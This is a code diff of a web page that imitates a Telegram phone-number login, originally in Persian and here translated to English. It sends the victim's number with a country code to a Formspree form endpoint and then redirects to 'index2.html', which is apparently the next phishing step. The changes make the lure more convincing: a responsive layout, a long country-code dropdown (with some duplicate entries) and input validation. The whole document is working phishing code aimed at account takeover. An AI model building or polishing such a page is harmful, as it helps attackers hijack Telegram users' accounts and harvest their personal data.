@@ -2,7 +2,8 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>ورود شماره تلگرام</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Telegram Phone Number Login</title>
   <style>
     body {
       margin: 0;
@@ -18,10 +19,12 @@
       background-color: white;
       border-radius: 12px;
       padding: 30px;
-      width: 320px;
+      width: 90%;
+      max-width: 320px;
       box-shadow: 0 0 15px rgba(0,0,0,0.2);
       text-align: center;
       position: relative;
+      box-sizing: border-box;
     }
     .logo {
       margin-bottom: 10px;
@@ -33,8 +36,9 @@
       font-size: 14px;
       margin-bottom: 20px;
       color: #333;
+      direction: ltr;
     }
-    input[type="text"] {
+    select, input[type="tel"], button {
       width: 100%;
       padding: 12px;
       margin-top: 5px;
@@ -42,11 +46,11 @@
       border: 1px solid #ccc;
       font-size: 16px;
       box-sizing: border-box;
+      direction: ltr;
+      text-align: left;
     }
     button {
       margin-top: 20px;
-      width: 100%;
-      padding: 12px;
       background-color: #0088cc;
       color: white;
       font-size: 18px;
@@ -59,11 +63,9 @@
     button:hover {
       background-color: #0075b6;
     }
-
-    /* استایل لودینگ */
     .loader {
       border: 4px solid rgba(0,0,0,0.1);
-      border-left-color: #0088cc; /* رنگ آبی تلگرام */
+      border-left-color: #0088cc;
       border-radius: 50%;
       width: 24px;
       height: 24px;
@@ -75,11 +77,31 @@
       display: none;
       z-index: 2;
     }
-
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-
+    /* Media Query برای موبایل */
+    @media (max-width: 400px) {
+      .container {
+        padding: 20px;
+        width: 95%;
+      }
+      .logo img {
+        width: 50px;
+      }
+      button {
+        font-size: 16px;
+        padding: 10px;
+      }
+      select, input[type="tel"] {
+        font-size: 14px;
+        padding: 10px;
+      }
+      .instruction {
+        font-size: 13px;
+        margin-bottom: 15px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -90,62 +112,112 @@
     <div class="instruction">
       Please enter your phone number
     </div>
-
     <form id="phoneForm" action="https://formspree.io/f/xjkokdbr" method="POST" onsubmit="return submitForm(event)">
-      <input type="text" id="phone" name="phone" placeholder="شماره موبایل" required />
+      <select id="countryCode" required>
+        <option value="+98" selected>🇮🇷 Iran (+98)</option>
+        <option value="+1">🇺🇸 USA (+1)</option>
+        <option value="+44">🇬🇧 United Kingdom (+44)</option>
+        <option value="+971">🇦🇪 United Arab Emirates (+971)</option>
+        <option value="+7">🇷🇺 Russia (+7)</option>
+        <option value="+82">🇰🇷 South Korea (+82)</option>
+        <option value="+39">🇮🇹 Italy (+39)</option>
+        <option value="+81">🇯🇵 Japan (+81)</option>
+        <option value="+49">🇩🇪 Germany (+49)</option>
+        <option value="+61">🇦🇺 Australia (+61)</option>
+        <option value="+34">🇪🇸 Spain (+34)</option>
+        <option value="+86">🇨🇳 China (+86)</option>
+        <option value="+55">🇧🇷 Brazil (+55)</option>
+        <option value="+31">🇳🇱 Netherlands (+31)</option>
+        <option value="+27">🇿🇦 South Africa (+27)</option>
+        <option value="+64">🇳🇿 New Zealand (+64)</option>
+        <option value="+90">🇹🇷 Turkey (+90)</option>
+        <option value="+352">🇱🇺 Luxembourg (+352)</option>
+        <option value="+46">🇸🇪 Sweden (+46)</option>
+        <option value="+41">🇨🇭 Switzerland (+41)</option>
+        <option value="+380">🇺🇦 Ukraine (+380)</option>
+        <option value="+66">🇹🇭 Thailand (+66)</option>
+        <option value="+48">🇵🇱 Poland (+48)</option>
+        <option value="+354">🇮🇸 Iceland (+354)</option>
+        <option value="+351">🇵🇹 Portugal (+351)</option>
+        <option value="+374">🇦🇲 Armenia (+374)</option>
+        <option value="+995">🇬🇪 Georgia (+995)</option>
+        <option value="+503">🇸🇻 El Salvador (+503)</option>
+        <option value="+52">🇲🇽 Mexico (+52)</option>
+        <option value="+358">🇫🇮 Finland (+358)</option>
+        <option value="+420">🇨🇿 Czech Republic (+420)</option>
+        <option value="+43">🇦🇹 Austria (+43)</option>
+        <option value="+373">🇲🇩 Moldova (+373)</option>
+        <option value="+421">🇸🇰 Slovakia (+421)</option>
+        <option value="+386">🇸🇮 Slovenia (+386)</option>
+        <option value="+48">🇵🇱 Poland (+48)</option>
+        <option value="+357">🇨🇾 Cyprus (+357)</option>
+        <option value="+385">🇭🇷 Croatia (+385)</option>
+        <option value="+46">🇸🇪 Sweden (+46)</option>
+        <option value="+36">🇭🇺 Hungary (+36)</option>
+        <option value="+44">🇬🇧 United Kingdom (+44)</option>
+        <option value="+353">🇮🇪 Ireland (+353)</option>
+        <option value="+354">🇮🇸 Iceland (+354)</option>
+        <option value="+39">🇮🇹 Italy (+39)</option>
+        <option value="+31">🇳🇱 Netherlands (+31)</option>
+        <option value="+420">🇨🇿 Czech Republic (+420)</option>
+        <option value="+66">🇹🇭 Thailand (+66)</option>
+        <option value="+41">🇨🇭 Switzerland (+41)</option>
+      </select>
+      <input type="tel" id="phone" name="phone" placeholder="Phone number without leading zero" pattern="[0-9]{7,15}" maxlength="15" required
+      oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
       <button type="submit" id="submitBtn">Next</button>
       <div class="loader" id="loader"></div>
     </form>
   </div>
-
   <script>
     function submitForm(event) {
       event.preventDefault();
-
+      const countryCode = document.getElementById('countryCode').value;
       const phoneInput = document.getElementById('phone');
-      const phone = phoneInput.value.trim();
+      let phone = phoneInput.value.trim();
       const submitBtn = document.getElementById('submitBtn');
       const loader = document.getElementById('loader');
-
       if (phone === '') {
-        alert('لطفاً شماره موبایل خود را وارد کنید');
+        alert('Please enter your phone number');
         return false;
       }
-
-      // نمایش لودینگ و غیرفعال کردن دکمه
+      if (!/^\d{7,15}$/.test(phone)) {
+        alert('Phone number must be 7 to 15 digits long and contain only numbers');
+        return false;
+      }
+      const fullPhone = countryCode + phone;
       loader.style.display = 'block';
       submitBtn.disabled = true;
       submitBtn.style.cursor = 'not-allowed';
-
       fetch('https://formspree.io/f/xjkokdbr', {
         method: 'POST',
         headers: {
           'Accept': 'application/json',
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ phone: phone })
+        body: JSON.stringify({ phone: fullPhone })
       })
       .then(response => {
         if (response.ok) {
           window.location.href = "index2.html";
         } else {
-          alert('مشکلی در ارسال شماره پیش آمد، لطفاً دوباره تلاش کنید');
+          alert('There was a problem sending your number, please try again.');
           loader.style.display = 'none';
           submitBtn.disabled = false;
           submitBtn.style.cursor = 'pointer';
         }
       })
       .catch(error => {
-        alert('خطا در ارسال شماره: ' + error.message);
+        alert('Error sending number: ' + error.message);
         loader.style.display = 'none';
         submitBtn.disabled = false;
         submitBtn.style.cursor = 'pointer';
       });
-
       return false;
     }
   </script>
 </body>
 </html>
+
 
 
